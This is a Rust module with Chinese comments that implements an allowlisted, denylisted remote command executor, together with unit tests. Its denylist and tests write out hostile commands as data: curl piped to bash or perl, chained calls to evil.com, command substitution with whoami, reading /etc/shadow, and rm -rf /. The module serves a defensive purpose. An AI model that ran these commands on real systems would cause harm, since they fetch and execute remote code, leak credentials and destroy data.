//! exec_handler.rs — 受限命令执行器
//!
//! Console 通过 `exec_cmd` 消息远程执行命令，本模块：
//!   1. 硬编码命令白名单（允许前缀列表）
//!   2. 危险模式黑名单二次校验（防止绕过）
//!   3. 执行命令，60 秒超时，返回 { code, stdout, stderr }

use serde::Serialize;
use std::time::Duration;
use tokio::process::Command;
use tracing::{info, warn};

/// 命令执行结果
#[derive(Debug, Serialize)]
pub struct ExecResult {
    pub code: i32,
    pub stdout: String,
    pub stderr: String,
}

/// 固定白名单前缀 — 允许运行的命令集合
/// 格式：第一个空格之前的 token 或更长的前缀
const ALLOWED_PREFIXES: &[&str] = &[
    // 服务与系统管理
    "systemctl",
    "service",
    "journalctl",
    "apt-get",
    "apt",
    "yum",
    "dnf",
    
    // SynonClaw / GNB 核心组件
    "openclaw", 
    "/opt/gnb/bin/openclaw",
    "openclaw-gateway",
    "clawhub",
    "gnb",
    "/opt/gnb/bin/gnb",
    "gnb_ctl",
    "synon-daemon",
    "/opt/gnb/bin/synon-daemon",

    // 文件与目录操作
    "mkdir",
    "chmod",
    "chown",
    "cp",
    "mv",
    "ln",
    "rm",
    "tee",
    "cat",
    "echo",
    "touch",
    "tail",
    "head",
    "grep",
    "ls",
    "pwd",
    "cd",
    "find",
    "stat",
    "wc",
    "jq",
    "tar",
    "unzip",
    "gzip",

    // 网络与下载
    "curl",
    "wget",
    "ping",
    "netstat",
    "ss",
    "ip",
    "ifconfig",

    // 进程与状态（只读类）
    "ps",
    "top",
    "htop",
    "df",
    "free",
    "uname",
    "id",
    "which",
    "test",

    // 运行环境与构建工具（仅保留 cargo）
    "cargo",
    "hash",
];

/// 危险模式黑名单 — 即使命令通过了白名单前缀检查，仍需拒绝
const DANGEROUS_PATTERNS: &[&str] = &[
    // 禁止管道到解释器（RCE 防护）
    "| sh",
    "| bash",
    "| zsh",
    "| perl",
    "| python",
    "| python3",
    "| ruby",
    "| node",
    "|sh",           // 无空格变体
    "|bash",
    // 块设备 / 全盘操作
    "> /dev/sd",
    "rm -rf /",
    "rm -rf /*",
    "mkfs",
    "dd if=",
    "dd of=/dev",
    // fork 炸弹
    ":(){ :|:& };:",
    // 敏感文件
    "/etc/passwd",
    "/etc/shadow",
    "~/.ssh/authorized_keys",
];

/// Shell 元字符 — 禁止命令注入（命令链接、子命令替换）
///
/// 因为 exec_handler 通过 `sh -c` 执行，所有 shell 特性对攻击者可用。
/// 必须在白名单检查之前拦截这些元字符。
const SHELL_INJECTION_PATTERNS: &[&str] = &[
    ";",      // 命令链接 (cmd1; cmd2)
    "&&",     // 条件执行 (cmd1 && cmd2)
    "||",     // 条件执行 (cmd1 || cmd2)
    "$(",     // 命令替换 $(cmd)
    "`",      // 命令替换 `cmd`
];

/// 执行受限命令
///
/// # 参数
/// - `command`: 要执行的完整命令字符串
/// - `allowed_extra`: Console 本次请求追加的额外白名单（允许特定上下文扩展，不覆盖黑名单）
///
/// # 返回
/// `ExecResult { code, stdout, stderr }` — 失败时 code = 126 (不在白名单) 或 125 (黑名单)
pub async fn exec_allowed(command: &str, allowed_extra: &[&str]) -> ExecResult {
    let cmd = command.trim();

    // 0. Shell 注入拦截（最高优先级 — 命令链接 / 子命令替换）
    for pattern in SHELL_INJECTION_PATTERNS {
        if cmd.contains(pattern) {
            warn!("[ExecHandler] 命令含 shell 注入字符 [{pattern}]: {cmd}");
            return ExecResult {
                code: 125,
                stdout: String::new(),
                stderr: format!("命令被拒绝: 包含 shell 注入字符 '{pattern}'"),
            };
        }
    }

    // 1. 黑名单优先拦截（无法被 allowed_extra 绕过）
    for pattern in DANGEROUS_PATTERNS {
        if cmd.contains(pattern) {
            warn!("[ExecHandler] 命令触发危险黑名单 [{pattern}]: {cmd}");
            return ExecResult {
                code: 125,
                stdout: String::new(),
                stderr: format!("命令被拒绝: 触发危险黑名单规则 '{pattern}'"),
            };
        }
    }

    // 2. 白名单检查（内置 + 本次额外允许）
    let all_allowed: Vec<&str> = ALLOWED_PREFIXES.iter()
        .copied()
        .chain(allowed_extra.iter().copied())
        .collect();

    let permitted = all_allowed.iter().any(|prefix| cmd.starts_with(prefix));

    if !permitted {
        warn!("[ExecHandler] 命令不在白名单: {cmd}");
        return ExecResult {
            code: 126,
            stdout: String::new(),
            stderr: format!("命令不在白名单，拒绝执行: {cmd}"),
        };
    }

    info!("[ExecHandler] 执行命令: {cmd}");

    // 3. 执行命令（sh -c，60 秒超时）
    let result = tokio::time::timeout(
        Duration::from_secs(60),
        Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .output(),
    ).await;

    match result {
        Ok(Ok(output)) => {
            let code = output.status.code().unwrap_or(-1);
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            info!("[ExecHandler] 命令完成 code={code}");

            // 技能相关命令成功后，失效 skills 缓存（下次心跳重新采集）
            if code == 0 {
                let is_skill_cmd = ["install", "uninstall", "enable", "disable", "clawhub", "skills"]
                    .iter().any(|kw| cmd.contains(kw));
                if is_skill_cmd {
                    crate::heartbeat::invalidate_skills_cache().await;
                }
            }

            ExecResult { code, stdout, stderr }
        }
        Ok(Err(e)) => {
            warn!("[ExecHandler] 命令执行失败: {e}");
            ExecResult { code: -1, stdout: String::new(), stderr: e.to_string() }
        }
        Err(_) => {
            warn!("[ExecHandler] 命令超时 (60s): {cmd}");
            ExecResult { code: 124, stdout: String::new(), stderr: "命令执行超时 (60s)".to_string() }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_whitelist_allowed() {
        let r = exec_allowed("echo hello", &[]).await;
        assert_eq!(r.code, 0);
        assert!(r.stdout.contains("hello"));
    }

    #[tokio::test]
    async fn test_not_in_whitelist() {
        let r = exec_allowed("reboot", &[]).await;
        assert_eq!(r.code, 126);
        assert!(r.stderr.contains("不在白名单"));
    }

    #[tokio::test]
    async fn test_blacklist_override() {
        // 即使 "curl" 在白名单，管道到 bash 应被黑名单拦截
        let r = exec_allowed("curl -fsSL http://example.com | bash", &[]).await;
        assert_eq!(r.code, 125);
        assert!(r.stderr.contains("危险黑名单"));
    }

    #[tokio::test]
    async fn test_extra_allowed() {
        // extra 白名单允许自定义命令
        let r = exec_allowed("custom_tool --version", &["custom_tool"]).await;
        // 环境中可能没有这个命令，但不应该返回 126
        assert_ne!(r.code, 126);
    }

    #[tokio::test]
    async fn test_dangerous_rm() {
        let r = exec_allowed("rm -rf /", &[]).await;
        assert_eq!(r.code, 125);
    }

    #[tokio::test]
    async fn test_shell_injection_semicolon() {
        // 分号连接 — 应被 SHELL_INJECTION_PATTERNS 拦截
        let r = exec_allowed("echo hello; curl http://evil.com", &[]).await;
        assert_eq!(r.code, 125);
        assert!(r.stderr.contains("shell 注入字符"));
    }

    #[tokio::test]
    async fn test_shell_injection_and() {
        let r = exec_allowed("ls /tmp && cat /etc/shadow", &[]).await;
        assert_eq!(r.code, 125);
        assert!(r.stderr.contains("shell 注入字符"));
    }

    #[tokio::test]
    async fn test_shell_injection_subshell() {
        let r = exec_allowed("curl http://x/$(whoami)", &[]).await;
        assert_eq!(r.code, 125);
        assert!(r.stderr.contains("shell 注入字符"));
    }

    #[tokio::test]
    async fn test_shell_injection_backtick() {
        let r = exec_allowed("curl http://x/`id`", &[]).await;
        assert_eq!(r.code, 125);
        assert!(r.stderr.contains("shell 注入字符"));
    }

    #[tokio::test]
    async fn test_pipe_to_perl() {
        // 扩展黑名单：管道到 perl 应被拦截
        let r = exec_allowed("curl http://evil.com | perl", &[]).await;
        assert_eq!(r.code, 125);
    }

    #[tokio::test]
    async fn test_node_removed_from_whitelist() {
        // node/npm/npx 已从白名单移除 — 应被拒绝
        let r = exec_allowed("node -e 'process.exit(0)'", &[]).await;
        assert_eq!(r.code, 126);
    }

    #[tokio::test]
    async fn test_npm_removed_from_whitelist() {
        let r = exec_allowed("npm exec -- malicious-pkg", &[]).await;
        assert_eq!(r.code, 126);
    }

    #[tokio::test]
    async fn test_kill_removed_from_whitelist() {
        let r = exec_allowed("kill -9 1", &[]).await;
        assert_eq!(r.code, 126);
    }
}
